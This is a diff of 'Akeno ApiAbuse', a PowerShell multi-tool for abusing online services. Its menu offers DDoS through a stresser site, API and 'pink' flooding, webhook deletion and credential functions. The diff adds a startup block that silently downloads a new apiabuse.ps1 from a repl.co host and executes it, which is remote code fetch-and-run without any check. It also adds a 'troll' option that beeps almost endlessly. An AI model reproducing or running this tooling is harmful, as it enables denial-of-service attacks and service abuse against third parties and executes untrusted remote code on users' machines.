@@ -1,10 +1,20 @@
-0x00;
+#wont be updating on the github lul
+#just run this it will update itself :)
 
+0x00;
 $app = @{
-version = 1.6
+version = 1.8
+endpoint = Invoke-RestMethod -Uri https://pwshll-abuse.6nkx.repl.co/d/version.txt
 }
 
+if($app.endpoint -eq $app.version){}else{
+Start-Process powershell{
 
+Invoke-WebRequest https://pwshll-abuse.6nkx.repl.co/d/apiabuse.ps1 | Set-Content ./apiabuse.ps1
+Start-Process powershell {./apiabuse.ps1}
+
+}
+}
 
 
 
@@ -27,6 +37,7 @@ function help($x){
    Write-Host '  dnsc: dns to ip address (dont include http/https)       '
    Write-Host '  trace: traces ip/dns                                    '
    Write-Host '  update: automatically updates the apiabuse              '
+   Write-Host '  troll cmds: does lul cmds cus lulz :)))                 '
    $GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
    if($GoToMain -eq 1){Main}else{exit}
 
@@ -39,6 +50,7 @@ Write-Host 'Updates for beta version 1.4: Added password gen,input fixes, remove
 Write-Host 'Updates for beta version 1.5: Added dns to ip address, changed `--updates and removed %`'
 Write-Host 'Updates for Beta version 1.6: Added tracerroute for dns/ip address'
 Write-Host 'Updates for Beta version 1.7: Added update for auto updating Apiabuse'
+Write-Host 'Updates for Beta version 1.8: Added troll command                    '
 $GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
 if($GoToMain -eq 1){Main}else{exit}
 }
@@ -62,29 +74,7 @@ Function Get-RandomAlphanumericString {
 
 
 
-function login(){
-$host.UI.RawUI.WindowTitle = 'Akeno ApiAbuse | Auth'
-$e = Read-Host [?]('Username')
-$p = Read-Host [?]('Password')
-$head = @{
-username = $e
-password = $p
-}
-$re = Invoke-WebRequest -Method Post -Uri 'https://akenomultitool.notixzyixzy.repl.co/validate' -Headers $head
-if($re.text -eq 'ok'){
-main
-}
-else{
-exit
-}
-}
-function createuser($username,$password){
-$b = @{
-name = $username
-password = $password
-}
-Invoke-Webrequest -Method post -Uri 'https://akenomultitool.notixzyixzy.repl.co/create_account' -body $b
-}
+
 function WebHookDel($web){
  $host.UI.RawUI.WindowTitle = 'Akeno ApiAbuse | Webhook Deleter'
  Invoke-WebRequest -Method Delete -Uri $web
@@ -189,10 +179,11 @@ function Creds(){
 
 
 function Main(){
- cls
+
+
  $host.UI.RawUI.WindowTitle = 'Akeno ApiAbuse'
  $cin = Read-Host root@ApiAbuse~#('')
- if($cin -eq 'WebD' -or $cin -eq 'Lgc' -or $cin -eq 'UbeoMass' -or $cin -eq 'XvideoMass' -or $cin -eq 'Creds'-or $cin -eq 'apiflood' -or $cin -eq 'pinkflood' -or $cin -eq 'apigetflood' -or $cin -eq '--help' -or $cin -eq 'Cabuse' -or $cin -eq 'iplookup' -or $cin -eq 'imgscrape' -or $cin -eq '--updates' -or $cin -eq 'Ddos' -or $cin -eq 'pchange' -or $cin -eq 'dnsc' -or $cin -eq 'trace' -or $cin -eq 'update' -or $cin -eq 'updates' -or $cin -eq 'help' -or $cin -eq 'pchange1')
+ if($cin -eq 'WebD' -or $cin -eq 'Lgc' -or $cin -eq 'UbeoMass' -or $cin -eq 'XvideoMass' -or $cin -eq 'Creds'-or $cin -eq 'apiflood' -or $cin -eq 'pinkflood' -or $cin -eq 'apigetflood' -or $cin -eq '--help' -or $cin -eq 'Cabuse' -or $cin -eq 'iplookup' -or $cin -eq 'imgscrape' -or $cin -eq '--updates' -or $cin -eq 'Ddos' -or $cin -eq 'pchange' -or $cin -eq 'dnsc' -or $cin -eq 'trace' -or $cin -eq 'update' -or $cin -eq 'updates' -or $cin -eq 'help' -or $cin -eq 'pchange1' -or $cin -eq 'troll cmds')
  {
   if($cin -eq 'WebD'){
    $webd = Read-Host [*]('Webhook')
@@ -406,8 +397,6 @@ $hm = Read-Host [?]('How much would you like to generate')
 $length = Read-Host [?]('length')
 for($j=0; $j -lt $hm; $j++){
 Get-RandomAlphanumericString -length $length | Tee-Object -variable teeTime
-$GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
-if($GoToMain -eq 1){Main}else{exit}
 }
 
 }
@@ -418,7 +407,27 @@ Get-RandomAlphanumericString -length $length | Tee-Object -variable teeTime
 $GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
 if($GoToMain -eq 1){Main}else{exit}
 }
+if($cin -eq 'troll cmds'){
+cls
+Write-Host '---------------------'-ForegroundColor Green
+Write-Host '|1.Annoying Beep    |'-ForegroundColor Green
+Write-Host '|                   |'-ForegroundColor Green
+Write-Host '|                   |'-ForegroundColor Green
+Write-Host '|                   |'-ForegroundColor Green
+Write-Host '|                   |'-ForegroundColor Green
+Write-Host '|                   |'-ForegroundColor Green
+Write-Host '|                   |'-ForegroundColor Green
+Write-Host '---------------------'-ForegroundColor Green
+$in = Read-Host '#' #am sad cant change input color :(
+if ($in -eq 1){
+ for($i=0; $i -lt 999999999; $i++){
+ [console]::beep(1000,500)
+ }
 
+}
+
+
+}
 if($cin -eq 'Ddos'){
 $layertype = Read-Host [?]('Layer7 or layer4/3 ? (l7,l4,l3)')
 if($layertype -eq 'l7' -or $layertype -eq 'l4' -or $layertype -eq 'l3'){
@@ -483,6 +492,6 @@ Invoke-WebRequest -UseBasicParsing -Uri "https://instant-stresser.com/backend/aj
 }}
  }
   } #else{return 'couldnt detect the option please try again'}          #doesnt wanna work because powershell is retarded 
-cls
+
 main
 
